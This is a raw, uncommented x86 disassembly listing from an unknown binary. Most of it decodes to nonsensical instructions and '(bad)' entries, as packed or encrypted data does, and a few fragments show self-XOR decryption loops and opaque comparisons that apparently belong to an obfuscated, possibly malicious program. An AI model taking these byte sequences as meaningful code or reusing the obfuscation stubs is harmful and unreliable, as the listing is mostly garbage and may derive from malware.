  402813:	aaa    
  402814:	iret   
  402815:	mov    dl,0xe
  402817:	mov    dl,BYTE PTR [ebp-0x20]
  40281a:	cmc    
  40281b:	fs push eax
  40281d:	into   
  40281e:	mov    ch,0xf0
  402820:	xchg   BYTE PTR [ecx+ebx*2+0x39],bl
  402824:	scas   eax,DWORD PTR es:[edi]
  402825:	outs   dx,BYTE PTR ds:[esi]
  402826:	or     DWORD PTR [ebx-0x73e68fd7],esi
  40282c:	shl    ah,1
  40282e:	jno    0x402859
  402830:	mov    dl,0x28
  402832:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402833:	sahf   
  402834:	dec    edx
  402835:	add    BYTE PTR [eax+0x1537db81],bl
  40283b:	sub    BYTE PTR [edi-0x3b],ah
  40283e:	cmp    al,0xf4
  402840:	pop    edi
  402841:	lea    edx,[eax-0x2baeab05]
  402847:	in     eax,0xed
  402849:	arpl   di,bp
  40284b:	or     eax,0xfa59249d
  402850:	ret    
  402851:	mov    cl,0x81
  402853:	or     BYTE PTR [esi-0x389f8ae4],bl
  402859:	add    eax,0x42e75e
  40285e:	adc    al,0x0
  402860:	add    BYTE PTR [eax],al
  402862:	cmp    DWORD PTR ds:0x42e75e,0x0
  402869:	je     0x4028b0
  40286f:	cmp    DWORD PTR ds:0x42e75e,0x6
  402876:	jne    0x402885
  40287c:	push   DWORD PTR [ebp-0xc]
  40287f:	call   DWORD PTR ds:0x42e9d8
  402885:	cmp    DWORD PTR ds:0x42e75e,0x7
  40288c:	jne    0x4028a0
  402892:	xor    eax,eax
  402894:	xor    eax,DWORD PTR ds:0x42e75e
  40289a:	dec    eax
  40289b:	mov    ds:0x42e75e,eax
  4028a0:	mov    eax,ds:0x42e75e
  4028a5:	dec    eax
  4028a6:	mov    ds:0x42e75e,eax
  4028ab:	jmp    0x402862
  4028b0:	mov    eax,DWORD PTR [ebp-0x8]
  4028b3:	xor    eax,ecx
  4028b5:	add    eax,esi
  4028b7:	pop    edi
  4028b8:	pop    esi
  4028b9:	pop    ebx
  4028ba:	leave  
  4028bb:	ret    0x4
  4028be:	mov    eax,DWORD PTR [ebp-0xc]
  4028c1:	add    eax,DWORD PTR [ebp-0x18]
  4028c4:	cmp    eax,0x7ad64f9f
  4028c9:	je     0x402c8e
  4028cf:	jmp    0x402c80
  4028d4:	clc    
  4028d5:	inc    edi
  4028d6:	adc    ah,dl
  4028d8:	xchg   ecx,eax
  4028d9:	jge    0x4028d7
  4028db:	pop    ebx
  4028dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028dd:	pop    eax
  4028de:	dec    ebp
  4028df:	push   edi
  4028e0:	jge    0x402924
  4028e2:	sbb    eax,0x7e03e62b
  4028e7:	jle    0x40286b
  4028e9:	jno    0x402969
  4028eb:	jle    0x402939
  4028ed:	sub    BYTE PTR [ecx+0x792db10c],al
  4028f3:	adc    eax,0xf426f249
  4028f8:	lea    ecx,ds:0x939a3eee
  4028fe:	adc    BYTE PTR [eax],0xb9
  402901:	test   DWORD PTR fs:[ebx-0xb],0x5f1484e4
  402909:	in     al,0x7a
  40290b:	dec    edx
  40290c:	cmp    ecx,DWORD PTR [eax]
  40290e:	cmp    bl,BYTE PTR [ebx-0x59e4d035]
  402914:	pop    ebx
  402915:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402916:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402917:	adc    eax,0x95247a54
  40291c:	test   DWORD PTR [ebp+0xa],0xf9518766
  402923:	popa   
  402924:	retf   0x4e89
  402927:	mov    ebx,0x357a88be
  40292c:	add    eax,0x1d7d1d21
  402931:	in     al,dx
  402932:	aas    
  402933:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402934:	inc    edx
  402935:	mov    ah,0x1
  402937:	fstp   QWORD PTR [edx-0x3e73ca0]
  40293d:	jg     0x4028e0
  40293f:	or     dl,BYTE PTR [ebp+0x40c13d86]
  402945:	in     al,0x5
  402947:	or     BYTE PTR [eax+0x16d80951],ch
  40294d:	fcom   QWORD PTR [eax+0x42eb0165]
  402953:	ror    BYTE PTR [ebx+eax*4+0x4757b1de],1
  40295a:	jl     0x4029c2
  40295c:	clc    
  40295d:	data16 sbb ah,bl
  402960:	sbb    BYTE PTR ds:[ecx+0x12],al
  402964:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402965:	jae    0x402966
  402967:	add    DWORD PTR [eax-0x73],edi
  40296a:	int    0x85
  40296c:	into   
  40296d:	aaa    
  40296e:	ret    0xdb10
  402971:	mov    esi,0x6c05b4e6
  402976:	xchg   esp,eax
  402977:	add    ecx,DWORD PTR [ebx+0x2b]
  40297a:	popa   
  40297b:	mov    al,ds:0xf3bfad8a
  402980:	dec    ebp
  402981:	lock ret 0xbc74
  402985:	inc    edi
  402986:	add    BYTE PTR [ecx+0x59e855a2],0x92
  40298d:	cwde   
  40298e:	or     al,0xc0
  402990:	icebp  
  402991:	in     eax,dx
  402992:	jecxz  0x402925
  402994:	cdq    
  402995:	scas   al,BYTE PTR es:[edi]
  402996:	enter  0x3230,0xae
  40299a:	icebp  
  40299b:	sub    cl,ah
  40299d:	rcr    BYTE PTR [ecx-0x8bbed11],0x21
  4029a4:	retf   
  4029a5:	and    bl,BYTE PTR [ecx+ebp*2+0x699be61b]
  4029ac:	push   ebp
  4029ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029ae:	jo     0x4029da
  4029b0:	call   0x196f:0xd477dbb7
  4029b7:	pop    eax
  4029b8:	cs cli 
  4029ba:	out    0xc,eax
  4029bc:	cwde   
  4029bd:	dec    ebp
  4029be:	or     al,0x45
  4029c0:	retf   
  4029c1:	xchg   edx,eax
  4029c2:	pop    esp
  4029c3:	jl     0x402a2e
  4029c5:	enter  0x2e09,0xd6
  4029c9:	ror    dh,cl
  4029cb:	shl    ecx,cl
  4029cd:	sub    al,0x17
  4029cf:	shl    DWORD PTR [edx+ebp*1-0x16649087],0x3f
  4029d7:	(bad)  
  4029d8:	cli    
  4029d9:	mov    ch,ch
  4029db:	xor    cl,ah
  4029dd:	retf   0xd4e
  4029e0:	mov    eax,ds:0x2af7055
  4029e5:	jp     0x4029e9
  4029e7:	out    0x89,eax
  4029e9:	sti    
  4029ea:	pop    ebp
  4029eb:	les    eax,FWORD PTR [edx]
  4029ed:	mov    bh,0x17
  4029ef:	stos   DWORD PTR es:[edi],eax
  4029f0:	mov    dh,BYTE PTR [edi+0x73]
  4029f3:	fdiv   QWORD PTR [edx+0x3b]
  4029f6:	cmc    
  4029f7:	into   
  4029f8:	dec    eax
  4029f9:	imul   eax,DWORD PTR [esi+0x46],0xc371fc53
  402a00:	(bad)  
  402a02:	mov    WORD PTR ds:0x630058b7,?
  402a08:	sbb    ah,cl
  402a0a:	jno    0x40298c
  402a0c:	out    0xf5,al
  402a0e:	xchg   ebp,eax
  402a0f:	fsubr  DWORD PTR [ecx-0x6d]
  402a12:	add    eax,0xbeefc410
  402a17:	cmp    ebp,DWORD PTR es:[ebp-0x56934645]
  402a1e:	mov    esi,0xb6849d7a
  402a23:	dec    ecx
  402a24:	mov    esp,DWORD PTR [ebp-0x79]
  402a27:	xor    BYTE PTR [esi],dh
  402a29:	or     al,0xbe
  402a2b:	push   ebx
  402a2c:	jb     0x402a6c
  402a2e:	inc    edi
  402a2f:	out    dx,al
  402a30:	(bad)  
  402a31:	mov    al,ds:0x128f4e60
  402a36:	jae    0x402a6d
  402a38:	mov    bl,0xab
  402a3a:	imul   ecx,DWORD PTR [ebx],0xffffffec
  402a3d:	inc    eax
  402a3e:	push   esi
  402a3f:	xor    BYTE PTR [ecx-0x12f6d902],ah
  402a45:	mov    edi,0x2dab2843
  402a4a:	fmul   QWORD PTR [edi]
  402a4c:	fs and al,0x26
  402a4f:	sbb    dl,al
  402a51:	and    DWORD PTR [ebx+0x6f6a036f],0xffffff8e
  402a58:	cdq    
  402a59:	mov    esp,0x87dfb232
  402a5e:	cdq    
  402a5f:	mov    DWORD PTR [ecx+0x70c9ac0c],ecx
  402a65:	pop    ecx
  402a66:	mov    DWORD PTR [esi+eiz*8-0x5973e6df],edi
  402a6d:	and    dl,bl
  402a6f:	cmp    eax,0xa8b59723
  402a74:	mov    esp,0x6e961dbe
  402a79:	inc    edi
  402a7a:	loopne 0x402a24
  402a7c:	jb     0x402aa3
  402a7e:	xor    BYTE PTR [edx-0x53a7125f],dh
  402a84:	sbb    DWORD PTR ds:[edi+0x7c2ad95a],ebx
  402a8b:	(bad)  
  402a8c:	and    DWORD PTR [esi+ecx*4+0x30f52503],edx
  402a93:	add    al,0xb6
  402a95:	dec    edx
  402a96:	jnp    0x402aa3
  402a98:	or     al,0xdc
  402a9a:	jmp    0xfca30324
  402a9f:	inc    ebx
  402aa0:	and    edi,eax
  402aa2:	adc    BYTE PTR [eax-0x19],bh
  402aa5:	loopne 0x402ab3
  402aa7:	ret    0x51bf
  402aaa:	mov    DWORD PTR [edx],edi
  402aac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402aad:	pop    es
  402aae:	fxam   
  402ab1:	xchg   ebp,eax
  402ab2:	mov    DWORD PTR [edx-0x4453f298],eax
  402ab8:	rcl    DWORD PTR [ecx],0x2f
  402abb:	sbb    dl,BYTE PTR [edx-0x80cfb39]
  402ac1:	je     0x402b2c
  402ac3:	cli    
  402ac4:	and    al,0x21
  402ac6:	adc    ebx,DWORD PTR [eax-0x4]
  402ac9:	mov    BYTE PTR [ecx-0x25],ah
  402acc:	in     al,dx
  402acd:	retf   
  402ace:	cmp    BYTE PTR [ebx+0x13bb92cd],cl
  402ad4:	rcr    DWORD PTR [ecx],cl
  402ad6:	sbb    al,0x75
  402ad8:	js     0x402ad3
  402ada:	mov    al,0xeb
  402adc:	xchg   edi,eax
  402add:	xchg   esp,eax
  402ade:	sub    DWORD PTR [ebp+0x3d7c5b22],esp
  402ae4:	out    0x54,eax
  402ae6:	test   BYTE PTR [edi],0xb3
  402ae9:	xchg   esp,eax
  402aea:	cli    
  402aeb:	fadd   st(3),st
  402aed:	loop   0x402adf
  402aef:	cdq    
  402af0:	inc    ecx
  402af1:	dec    eax
  402af2:	shr    DWORD PTR [ebx-0x5b],1
  402af5:	pop    edi
  402af6:	ret    0x913a
  402af9:	pop    eax
  402afa:	xor    ecx,DWORD PTR [ecx+esi*2]
  402afd:	das    
  402afe:	jbe    0x402b78
  402b00:	inc    ebx
  402b01:	in     al,0xb8
  402b03:	push   esi
  402b04:	adc    al,0xe2
  402b06:	pop    eax
  402b07:	mov    dl,0x9b
  402b09:	mov    eax,0x4fdd7786
  402b0e:	inc    edi
  402b0f:	xor    al,bl
  402b11:	mov    ebp,0x7b638bc4
  402b16:	popf   
  402b17:	sub    DWORD PTR [ecx+0x2c17e132],0xf
  402b1e:	retf   
  402b1f:	cmp    DWORD PTR [ebx-0xe],edx
  402b22:	popa   
  402b23:	and    esp,DWORD PTR [ecx-0x44643b67]
  402b29:	jno    0x402b0e
  402b2b:	xchg   ecx,eax
  402b2c:	mov    cl,0xd5
  402b2e:	push   eax
  402b2f:	(bad)  
  402b30:	or     dl,BYTE PTR [edi+0x72]
  402b33:	jae    0x402b7a
  402b35:	jmp    0x402b5c
  402b37:	sub    ebx,DWORD PTR [esi+0x4f]
  402b3a:	imul   eax,DWORD PTR [edi],0xd61e740
  402b40:	sbb    cl,BYTE PTR [edx-0x45]
  402b43:	mov    BYTE PTR [esi-0x32],0x15
  402b47:	fs cli 
  402b49:	mov    BYTE PTR [ecx-0x6e],ch
  402b4c:	mov    DWORD PTR [eax+0x0],esi
  402b4f:	cdq    
  402b50:	xor    dl,BYTE PTR [edx-0x45]
  402b53:	cmp    bl,cl
  402b55:	icebp  
  402b56:	sar    DWORD PTR [ebx-0x5c66f555],cl
  402b5c:	in     al,dx
  402b5d:	aaa    
  402b5e:	dec    eax
  402b5f:	add    bl,BYTE PTR [ebp+0x6fc578a4]
  402b65:	int    0xf4
  402b67:	dec    eax
  402b68:	bound  ecx,QWORD PTR ds:0xcefbdfb1
  402b6e:	push   cs
  402b6f:	shl    esp,1
  402b71:	jmp    0xa214c03d
  402b76:	dec    ebx
  402b77:	sbb    ah,BYTE PTR [edi]
  402b79:	or     BYTE PTR [eiz*4-0x58bec808],cl
  402b80:	mov    esp,0x6fcb7207
  402b85:	mov    al,ah
  402b87:	mov    ds:0x6b2396b1,al
  402b8c:	or     BYTE PTR [edx+0x6ab49777],bh
  402b92:	lock clc 
  402b94:	xor    eax,0xa18152ae
  402b99:	loop   0x402b6d
  402b9b:	xor    ch,BYTE PTR [ebp-0x6b]
  402b9e:	push   ds
  402b9f:	adc    cl,ch
  402ba1:	dec    esp
  402ba2:	jb     0x402be2
  402ba4:	into   
  402ba5:	xor    esi,DWORD PTR [ecx-0x7bc43bb]
  402bab:	inc    ecx
  402bac:	push   ebp
  402bad:	fbstp  TBYTE PTR [edi-0x4c568ab]
  402bb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bb4:	dec    ebp
  402bb5:	fwait
  402bb6:	pop    ecx
  402bb7:	inc    ecx
  402bb8:	push   0xffffffb2
  402bba:	rcr    DWORD PTR [ebp-0x28ffc872],1
  402bc0:	add    DWORD PTR [eax+eiz*8],esi
  402bc3:	mov    edx,0xc855ec99
  402bc8:	bound  edi,QWORD PTR [esi+eax*4+0x614f5beb]
  402bcf:	add    bh,BYTE PTR [eax-0x7b]
  402bd2:	mov    esi,0x9a47da08
  402bd7:	or     al,0x63
  402bd9:	xor    al,0x8f
  402bdb:	mov    DWORD PTR [ecx],0x77b87d7b
  402be1:	iret   
  402be2:	mov    esp,0x602d4a84
  402be7:	xor    DWORD PTR [edx-0x5],esp
  402bea:	sbb    edx,DWORD PTR [edx]
  402bec:	clc    
  402bed:	or     al,0xd0
  402bef:	sub    ch,BYTE PTR [eax+0x60]
  402bf2:	xchg   edx,eax
  402bf3:	les    ecx,FWORD PTR [ecx-0x700ee734]
  402bf9:	fild   DWORD PTR [edx]
  402bfb:	aas    
  402bfc:	mov    bh,0x73
  402bfe:	(bad)  
  402bff:	in     eax,dx
  402c00:	imul   DWORD PTR [esi-0x23]
  402c03:	test   BYTE PTR [edx-0x32a233a],al
  402c09:	and    al,dl
  402c0b:	retf   
  402c0c:	sahf   
  402c0d:	add    BYTE PTR [eax+0x6c0f67d],ch
  402c13:	mov    cl,0xb0
  402c15:	mov    al,0x6
  402c17:	dec    esp
  402c18:	jbe    0x402c16
  402c1a:	and    dl,BYTE PTR [edx]
  402c1c:	rol    cl,0xbe
  402c1f:	aaa    
  402c20:	pushf  
  402c21:	sbb    eax,0xab0c349f
  402c26:	imul   ebx,edi,0x6ea8b988
  402c2c:	xor    al,0x71
  402c2e:	sub    eax,0x39c1f2bf
  402c33:	cwde   
  402c34:	test   edx,eax
  402c36:	xor    eax,0xd3d59318
  402c3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c3c:	icebp  
  402c3d:	arpl   di,si
  402c3f:	cmp    eax,0x92d055b3
  402c44:	je     0x402c83
  402c46:	enter  0x3f6,0x1d
  402c4a:	aad    0x2
  402c4c:	cwde   
  402c4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c4e:	pop    ds
  402c4f:	xor    eax,0xf4226df7
  402c54:	xor    esi,ecx
  402c56:	fdivr  QWORD PTR [esi]
  402c58:	jmp    0xa2f0c0eb
  402c5d:	cs or  ebp,edi
  402c60:	aas    
  402c61:	(bad)
  402c64:	jns    0x402bf9
  402c66:	and    BYTE PTR [ebx+eiz*1-0x1d5d9b3f],dl
  402c6d:	xchg   esi,eax
  402c6e:	in     al,0xc3
  402c70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c71:	pop    ebp
  402c72:	lahf   
  402c73:	xchg   ecx,eax
  402c74:	jg     0x402cbc
  402c76:	mov    edi,0x7f67a5dd
  402c7b:	int    0x4e
  402c7d:	or     ebp,DWORD PTR [edx-0xfba74a5]
  402c83:	and    DWORD PTR [eax],0x751c9d
  402c89:	jmp    0x402858
  402c8e:	mov    eax,DWORD PTR [ebp-0xc]
  402c91:	mov    edx,DWORD PTR [ebp-0x18]
  402c94:	or     eax,edx
  402c96:	cmp    eax,0xfabf2dff
  402c9b:	je     0x403060
  402ca1:	mov    eax,DWORD PTR [ebp-0x10]
  402ca4:	xor    DWORD PTR [eax],0x2650fa8f
  402caa:	jmp    0x402858
  402caf:	jmp    0x403060
  402cb4:	adc    al,0x1c
  402cb6:	repnz push edx
  402cb8:	mov    edx,0x415cd47c
  402cbd:	test   dl,cl
  402cbf:	inc    esp
  402cc0:	mov    ds:0xa5d8580,al
  402cc5:	pop    es
  402cc6:	jle    0x402d46
  402cc8:	xor    BYTE PTR [ecx+0x7e],0x7e
  402ccc:	cmp    ah,BYTE PTR [eax-0x5be12a7a]
  402cd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cd3:	and    eax,0x8e8149c
  402cd8:	mov    ebp,0xb6673932
  402cdd:	adc    ah,BYTE PTR ds:0x49d8725d
  402ce3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ce4:	add    esi,ebx
  402ce6:	loopne 0x402cef
  402ce8:	fdiv   QWORD PTR [edi+0x73]
  402ceb:	or     eax,0xd1f6c0b4
  402cf0:	dec    esp
  402cf1:	mov    edx,DWORD PTR [eax]
  402cf3:	mov    esp,0xf1c6e72e
  402cf8:	lds    edi,FWORD PTR [edx]
  402cfa:	xchg   ecx,eax
  402cfb:	arpl   WORD PTR [edi+0x7a38875],cx
  402d01:	ror    BYTE PTR [ecx+0x25ef9b45],1
  402d07:	stc    
  402d08:	pop    eax
  402d09:	pushf  
  402d0a:	scas   al,BYTE PTR es:[edi]
  402d0b:	pop    esp
  402d0c:	fdivr  DWORD PTR [edx+ebx*8]
  402d0f:	lods   al,BYTE PTR ds:[esi]
  402d10:	inc    ebp
  402d11:	add    bh,BYTE PTR [ebp-0xd42fcc3]
  402d17:	jno    0x402d67
  402d19:	mov    ch,0x7f
  402d1b:	and    al,0x54
  402d1d:	ds out 0x27,al
  402d20:	loope  0x402cfd
  402d22:	xor    esp,DWORD PTR [esi]
  402d24:	aam    0x6d
  402d26:	mov    bl,0x31
  402d28:	test   DWORD PTR [eax-0xb],ecx
  402d2b:	pop    ebp
  402d2c:	test   al,0x20
  402d2e:	aad    0x22
  402d30:	dec    DWORD PTR [esi]
  402d32:	xchg   DWORD PTR [esi-0x3aeaf46e],esp
  402d38:	jne    0x402d2d
  402d3a:	loop   0x402d86
  402d3c:	sahf   
  402d3d:	xchg   BYTE PTR [eax+0x6dcc099c],bl
  402d43:	setl   BYTE PTR [eax-0x28]
  402d47:	pusha  
  402d48:	add    eax,0xf701b52a
  402d4d:	xor    DWORD PTR [ebx+0x6],esp
  402d50:	dec    edi
  402d51:	ret    
  402d52:	cli    
  402d53:	or     ah,bl
  402d55:	sub    edx,esi
  402d57:	daa    
  402d58:	sti    
  402d59:	adc    DWORD PTR [ebx-0x53c16eb7],ecx
  402d5f:	aam    0xbc
  402d61:	aas    
  402d62:	(bad)  
  402d63:	pop    ds
  402d64:	jne    0x402dd9
  402d66:	sbb    DWORD PTR [esi+0x441f568e],ebp
  402d6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d6d:	int3   
  402d6e:	inc    edi
  402d6f:	push   ebx
  402d70:	js     0x402d27
  402d72:	adc    ebp,DWORD PTR [esi+0x62]
  402d75:	xchg   ecx,eax
  402d76:	lock fist WORD PTR [edx+0x40]
  402d7a:	xchg   esp,eax
  402d7b:	ins    BYTE PTR es:[edi],dx
  402d7c:	sahf   
  402d7d:	(bad)  
  402d7f:	loopne 0x402df9
  402d81:	mov    ecx,0x38980f76
  402d86:	ja     0x402e06
  402d88:	imul   edi,DWORD PTR [ebp-0x5877756d],0xe5a53135
  402d92:	out    0x93,al
  402d94:	pop    esi
  402d95:	stos   DWORD PTR es:[edi],eax
  402d96:	jae    0x402d90
  402d98:	add    esi,esp
  402d9a:	push   ds
  402d9b:	add    ah,BYTE PTR [edx+0x2fa1597a]
  402da1:	jl     0x402dd8
  402da3:	mov    ebx,0x655409b3
  402da8:	into   
  402da9:	(bad)  
  402daa:	rcr    BYTE PTR [ecx],1
  402dac:	gs jo  0x402d9f
  402daf:	out    dx,eax
  402db0:	inc    ebp
  402db1:	xor    DWORD PTR [eax+ecx*2],ecx
  402db4:	aaa    
  402db5:	test   BYTE PTR [ebp-0x18a777ea],ch
  402dbb:	aad    0x3f
  402dbd:	popa   
  402dbe:	es mov ebp,0xb533346f
  402dc4:	pop    esi
  402dc5:	add    DWORD PTR [ebx+ebx*2],0xffffff98
  402dc9:	jbe    0x402d5d
  402dcb:	sbb    al,0x3
  402dcd:	ror    al,0xdf
  402dd0:	(bad)  
  402dd2:	add    ah,BYTE PTR [ecx-0xf]
  402dd5:	(bad)  
  402dd6:	fwait
  402dd7:	sub    eax,0x30c118bd
  402ddc:	and    bh,BYTE PTR [ebp+0x1553561e]
  402de2:	mov    dl,0x4f
  402de4:	jmp    0x402ddb
  402de6:	mov    esp,0x6b19f084
  402deb:	pop    ecx
  402dec:	or     eax,0xfd413107
  402df1:	stos   DWORD PTR es:[edi],eax
  402df2:	xor    DWORD PTR gs:[esi+0x341e21a1],eax
  402df9:	jne    0x402e5d
  402dfb:	push   es
  402dfc:	mov    bl,0xd5
  402dfe:	mov    edi,0x8d849e77
  402e03:	and    al,0xe
  402e05:	jmp    0x402e5f
  402e07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e08:	pusha  
  402e09:	sbb    al,0x9e
  402e0b:	sbb    eax,edi
  402e0d:	jb     0x402dca
  402e0f:	mov    ebx,ebp
  402e11:	loop   0x402e2c
  402e13:	ins    BYTE PTR es:[edi],dx
  402e14:	xchg   ecx,eax
  402e15:	lods   al,BYTE PTR ds:[esi]
  402e16:	jmp    0x769e6cd3
  402e1b:	loop   0x402dd3
  402e1d:	out    dx,eax
  402e1e:	rol    DWORD PTR ds:0xa7d449ce,cl
  402e24:	mov    al,BYTE PTR [eax+0x5a]
  402e27:	lahf   
  402e28:	iret   
  402e29:	sbb    ah,bh
  402e2b:	mov    esp,0x8d1544b9
  402e30:	popf   
  402e31:	int3   
  402e32:	stc    
  402e33:	outs   dx,BYTE PTR ds:[esi]
  402e34:	cwde   
  402e35:	pop    es
  402e36:	bound  ebp,QWORD PTR [esi+0x7d]
  402e39:	in     al,dx
  402e3a:	je     0x402e15
  402e3c:	sti    
  402e3d:	loopne 0x402dc5
  402e3f:	leave  
  402e40:	cmp    ebx,ecx
  402e42:	sbb    esi,DWORD PTR [edx+0x1f63a1d8]
  402e48:	mov    dh,0x3e
  402e4a:	nop
  402e4b:	mov    ah,0xd5
  402e4d:	adc    ebp,DWORD PTR [eax]
  402e4f:	adc    DWORD PTR [edx],0x22578611
  402e55:	fmul   DWORD PTR [esi+ecx*2]
  402e58:	mov    DWORD PTR [eax-0x8],eax
  402e5b:	cmp    bh,BYTE PTR [edx-0x5e]
  402e5e:	js     0x402e15
  402e60:	add    DWORD PTR [edi+0x5f],edi
  402e63:	cmp    al,0x46
  402e65:	push   edx
  402e66:	pop    ss
  402e67:	xchg   ecx,eax
  402e68:	and    eax,0x73d0882b
  402e6d:	and    al,0x34
  402e6f:	outs   dx,DWORD PTR ds:[esi]
  402e70:	push   cs
  402e71:	pop    esp
  402e72:	jno    0x402ed2
  402e74:	push   eax
  402e75:	es xchg ebx,eax
  402e77:	je     0x402ed1
  402e79:	in     al,dx
  402e7a:	mov    ebx,0x598aa0f8
  402e7f:	test   BYTE PTR [ebx-0x6ab85a40],ch
  402e85:	pop    ebx
  402e86:	cmp    al,0xf2
  402e88:	dec    edx
  402e89:	jle    0x402f04
  402e8b:	xchg   dh,ch
  402e8d:	hlt    
  402e8e:	dec    ecx
  402e8f:	ficomp WORD PTR [ebp+0x33]
  402e92:	sbb    dh,ch
  402e94:	cmp    ecx,ebp
  402e96:	sub    esp,DWORD PTR [ecx]
  402e98:	fwait
  402e99:	adc    DWORD PTR [eax+edi*4],ecx
  402e9c:	xchg   ecx,eax
  402e9d:	ret    
  402e9e:	test   al,0xb
  402ea0:	mov    al,ds:0x63346db5
  402ea5:	imul   edx,eax,0xda9fa163
  402eab:	add    eax,DWORD PTR [ebx+0x7f]
  402eae:	bnd jo 0x402e5f
  402eb1:	sbb    DWORD PTR [ecx+0x6949e812],0xfffffffd
  402eb8:	cmp    DWORD PTR [edi],eax
  402eba:	ret    0x3319
  402ebd:	imul   edi,DWORD PTR [ecx+0x6b24452a],0x253a2337
  402ec7:	ror    BYTE PTR [ecx],0x24
  402eca:	mov    edi,0x9ce494f7
  402ecf:	cdq    
  402ed0:	xchg   edi,eax
  402ed1:	cmp    DWORD PTR [edx-0x37],0x75
  402ed5:	and    bh,BYTE PTR [ebp-0x6b]
  402ed8:	mov    cl,0xf7
  402eda:	(bad)  
  402edb:	iret   
  402edc:	sbb    eax,0x932441dd
  402ee1:	xchg   DWORD PTR [edx+0x6a],eax
  402ee4:	dec    ebp
  402ee5:	sahf   
  402ee6:	mov    edx,0xd17acf9b
  402eeb:	maskmovq mm5,(bad)
  402eec:	imul   DWORD PTR [edi+0x50b238f5]
  402ef2:	sub    ecx,ecx
  402ef4:	push   cs
  402ef5:	and    esi,esp
  402ef7:	inc    ebx
  402ef8:	popf   
  402ef9:	sti    
  402efa:	jge    0x402f5b
  402efc:	cmp    BYTE PTR [ecx-0x2cbb72d7],0x91
  402f03:	pop    esi
  402f04:	arpl   cx,sp
  402f06:	xor    al,0xd3
  402f08:	pop    edx
  402f09:	loopne 0x402ec5
  402f0b:	sub    BYTE PTR [ecx+ebx*4],ah
  402f0e:	es aaa 
  402f10:	fnstenv [ebp-0x1066e071]
  402f16:	adc    al,0xe
  402f18:	xor    esp,0xde8ed6a6
  402f1e:	xlat   BYTE PTR ds:[ebx]
  402f1f:	dec    ebx
  402f20:	push   eax
  402f21:	ins    BYTE PTR es:[edi],dx
  402f22:	aas    
  402f23:	jecxz  0x402f80
  402f25:	pushf  
  402f26:	pop    ecx
  402f27:	mov    ch,BYTE PTR [ecx-0x52dae618]
  402f2d:	cli    
  402f2e:	cwde   
  402f2f:	into   
  402f30:	push   0x2
  402f32:	adc    al,0x3e
  402f34:	xchg   edx,eax
  402f35:	push   cs
  402f36:	fucomp st(3)
  402f38:	in     al,dx
  402f39:	ror    esp,1
  402f3b:	push   ebp
  402f3c:	inc    esi
  402f3d:	xlat   BYTE PTR ds:[ebx]
  402f3e:	adc    ebx,DWORD PTR [ebp+0x66]
  402f41:	xor    dh,BYTE PTR [eax*4+0x6f45d8b6]
  402f48:	in     eax,dx
  402f49:	fdivr  DWORD PTR [edi-0x79]
  402f4c:	mov    es,eax
  402f4e:	cs jmp 0x5977:0xcdc07102
  402f56:	cs fs lock imul esi,eax,0x3b42bbcc
  402f5f:	retf   0x8878
  402f62:	sbb    ch,ch
  402f64:	and    WORD PTR [eax-0x7a6cc6b],0x972d
  402f6d:	icebp  
  402f6e:	scas   eax,DWORD PTR es:[edi]
  402f6f:	push   ebx
  402f70:	fwait
  402f71:	(bad)  
  402f72:	(bad)  
  402f73:	int3   
  402f74:	pop    edx
  402f75:	pop    edi
  402f76:	lea    ebx,[esi-0x4c2f7fb5]
  402f7c:	sub    BYTE PTR [esi],ah
  402f7e:	sub    DWORD PTR [edi-0x2ead5834],ecx
  402f84:	int    0xec
  402f86:	in     eax,0x10
  402f88:	dec    ebp
  402f89:	dec    ebp
  402f8a:	xor    DWORD PTR [ecx-0x5378dea6],esp
  402f90:	sbb    eax,0x4da3b9df
  402f95:	adc    cl,BYTE PTR [ecx+edi*4]
  402f98:	gs adc al,0x6f
  402f9b:	mov    WORD PTR [edx-0x79],?
  402f9e:	out    0xc2,eax
  402fa0:	push   esi
  402fa1:	adc    BYTE PTR cs:[ebp-0x3795e15f],bh
  402fa8:	lock mov cl,0xa4
  402fab:	out    0xbb,eax
  402fad:	push   ds
  402fae:	inc    eax
  402faf:	cdq    
  402fb0:	rol    BYTE PTR [ecx-0x52],0x4d
  402fb4:	(bad)  
  402fb5:	stc    
  402fb6:	pop    ds
  402fb7:	inc    ebx
  402fb8:	sbb    al,0x9d
  402fba:	inc    esi
  402fbb:	ss xchg ebp,eax
  402fbd:	enter  0xea49,0x1b
  402fc1:	call   0xe3a1458e
  402fc6:	jno    0x402fbf
  402fc8:	mov    ch,0x7
  402fca:	lea    edi,[edx+0x74]
  402fcd:	dec    edi
  402fce:	sbb    eax,0xecb13959
  402fd3:	pop    eax
  402fd4:	sti    
  402fd5:	xor    edi,DWORD PTR [edi]
  402fd7:	fld    TBYTE PTR cs:[ebx]
  402fda:	addr16 imul edx,esi,0x43
  402fde:	pop    ebx
  402fdf:	jb     0x403002
  402fe1:	or     BYTE PTR [eax+0x6b],dh
  402fe4:	ja     0x402fe6
  402fe6:	dec    edx
  402fe7:	or     cl,dh
  402fe9:	mov    ch,0x6c
  402feb:	imul   esp,DWORD PTR [eax-0x1c],0xf779c274
  402ff2:	pop    edi
  402ff3:	sbb    DWORD PTR [eax+0x59],eax
  402ff6:	xchg   edi,eax
  402ff7:	out    dx,eax
  402ff8:	cmp    edi,esi
  402ffa:	scas   eax,DWORD PTR es:[edi]
  402ffb:	call   0xcb3f4900
  403000:	outs   dx,BYTE PTR ds:[esi]
  403001:	mov    ebp,0xef132cf2
  403006:	adc    BYTE PTR [ecx+0x61],0x98
  40300a:	fidivr WORD PTR [ebx]
  40300c:	fadd   st,st(7)
  40300e:	test   eax,0x6a1aed0c
  403013:	gs mov ch,0x91
